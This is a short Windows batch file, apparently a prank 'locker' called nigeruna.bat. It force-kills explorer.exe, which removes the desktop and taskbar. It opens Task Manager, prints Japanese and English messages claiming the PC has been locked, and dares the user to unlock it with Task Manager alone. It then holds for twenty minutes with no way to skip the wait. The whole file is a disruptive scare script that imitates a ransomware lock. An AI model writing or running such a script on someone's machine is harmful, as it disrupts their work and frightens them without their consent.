@echo off
start taskmgr.exe >nul
taskkill /f /im explorer.exe >nul
echo あなたのPCはnigeruna.batによりロックされました。
echo Your PC has been locked by nigeruna .bat.
echo これだけを使って解除してみろ
echo Use this alone to unlock it.
timeout /nobreak 1200 >null
start